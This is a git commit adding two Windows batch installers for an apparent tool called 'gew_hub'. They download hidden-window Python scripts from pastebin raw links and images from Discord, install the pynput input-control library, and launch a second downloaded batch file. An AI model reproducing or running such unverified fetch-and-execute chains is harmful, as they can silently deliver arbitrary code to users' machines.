8a1a70157a32bc4f7642bba500fe7a3032f25ff2
demassimo <87481244+demassimo@users.noreply.github.com>
2021-07-15 14:46:06 +0200

    Add files via upload

---
+++ installer_update.bat
@@ -0,0 +1,11 @@
+echo off
+cd lazy
+echo created lazy file 
+curl -o hub.pyw https://pastebin.com/raw/KpdkR2YB
+curl -o scripts.pyw https://pastebin.com/raw/GMqcwTpx
+curl -o config.pyw https://pastebin.com/raw/vcjkgUSi
+curl -o close.png https://cdn.discordapp.com/attachments/749252806010994689/865165707678973962/close.png  
+curl -o minimize.png https://cdn.discordapp.com/attachments/749252806010994689/865181655672422400/minimize.png
+
+echo Installing pip files
+pip install pynput
---
+++ installer_updater.bat
@@ -0,0 +1,6 @@
+echo off
+mkdir gew_hub
+cd gew_hub 
+curl -o installer_update.bat https://pastebin.com/raw/zREBJ8Ws
+pause
+start installer_update.bat
